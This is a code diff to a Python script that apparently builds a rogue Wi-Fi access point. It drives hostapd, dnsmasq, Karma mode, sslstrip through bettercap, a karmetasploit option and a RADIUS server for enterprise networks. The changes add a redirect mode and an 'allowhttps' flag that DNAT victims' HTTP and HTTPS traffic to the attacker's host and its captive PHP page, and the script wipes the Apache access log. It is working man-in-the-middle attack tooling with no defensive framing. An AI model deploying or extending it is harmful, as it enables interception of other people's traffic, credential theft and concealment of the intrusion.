@@ -8,7 +8,8 @@ parser.add_argument('-m', action="store",dest="m",choices=set(("enterprise","per
 parser.add_argument('-k', action="store_true",dest="k",help="Enable Karma mode")
 parser.add_argument('-s', action="store_true",dest="s",help="Enable sslstrip")
 parser.add_argument('-w', action="store",dest="w",help="Setup Web server",choices=set(("apache","karmetasploit")))
-parser.add_argument('-d', action="store",dest="d",help="Persistent DNS mode",choices=set(("Once","Persistent")))
+parser.add_argument('-d', action="store",dest="d",help="Persistent Redirect mode",choices=set(("Once","Persistent")))
+parser.add_argument('-allowhttps', action="store_true",dest="allowhttps",help="Persistent Redirect mode")
 args = parser.parse_args()
 
 interface = args.i
@@ -16,8 +17,9 @@ essid = args.e
 mode = args.m
 karma = args.k
 web = args.w
-dns = args.d
+redirect = args.d
 sslstrip = args.s
+allowhttps = args.allowhttps
 bssid = "1a:23:56:b4:90:6c"
 hostip = "192.168.10.254"
 channel = str(1)
@@ -109,11 +111,12 @@ def config_apache():
     if( $mac === NULL) {\n\t\t
         echo "Access Denied."; exit;\n\t
     }\n\t
-    $cmd = "sudo iptables -t mangle -I internet 1 -m mac --mac-source ".$mac." -j RETURN";\n\t
-    shell_exec($cmd);\n\t
-    ?>\n
+    $cmd = "sudo iptables -t mangle -I internet 1 -m mac --mac-source ".$mac." -j RETURN";\n\t"""
+    if redirect == "Once":
+        htmlContent += "shell_exec($cmd);\n\t"
+    htmlContent += """?>\n
     <style>\nimg{\nposition: fixed; right: 0; bottom: 0;\nmin-width: 100%; min-height: 100%;\nwidth: auto; height: auto; z-index: -100;\nbackground: url(polina.jpg) no-repeat;
-    \nbackground-size: cover;\n}\n</style>\n<img src="kid.jpg">\n<video autoplay>\n<source src="video" type="video/mp4">\n</video> """
+    \nbackground-size: cover;\n}\n</style>\n<img src="kid.jpg">\n<audio autoplay loop><source src="sound.mp3"></audio> """
     os.system("rm /var/www/html/index*")
     os.system("echo '' > /var/log/apache2/access.log")
     file = open("/var/www/html/index.php","w")
@@ -132,11 +135,15 @@ def config_iptables():
     os.system("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
     if mode == "enterprise":
         os.system("sudo iptables -t nat -I POSTROUTING 1 -p udp --dport 1812 -j ACCEPT")
-    if dns == "Once":
+    if redirect == "Once" or redirect == "Persistent":
         os.system("sudo iptables -t mangle -N internet")
         os.system("sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp --dport 80 -j internet")
+        if allowhttps == False:
+            os.system("sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp --dport 443 -j internet")
+            os.system("sudo iptables -t nat -I PREROUTING -i wlan0 -p tcp -m mark --mark 99 -m tcp --dport 443 -j DNAT --to-destination "+hostip)
         os.system("sudo iptables -t mangle -A internet -j MARK --set-mark 99")
         os.system("sudo iptables -t nat -I PREROUTING -i wlan0 -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination "+hostip)
+
 
         
     
@@ -147,8 +154,6 @@ def config_dhcp():
     dhcp.write("dhcp-range=192.168.10.5,192.168.10.20\n")
     dhcp.write("dhcp-leasefile=/etc/dnsmasq.leases\n")
     dhcp.write("dhcp-authoritative\n")
-    if dns == "Persistent":
-        dhcp.write("address=/#/"+hostip)
     dhcp.close()
     os.system("cat dnsmasq.conf > /etc/dnsmasq.conf")
     os.system("service dnsmasq restart")
@@ -228,13 +233,13 @@ while True:
     except KeyboardInterrupt:
         if mode == "enterprise":
             os.system("killall radiusd")
-        if dns == "Once":
-            os.system("iptables -t mangle -X internet")
         if sslstrip == True:
             os.system("killall bettercap")
         os.system("killall hostapd")
         os.system("iptables -t nat -F")
         os.system("iptables -t mangle -F")
+        if redirect == "Once" or redirect == "Persistent":
+            os.system("iptables -t mangle -X internet")
         os.system("service dnsmasq stop")
         os.system("service apache2 stop")
         os.system("service postgresql stop")
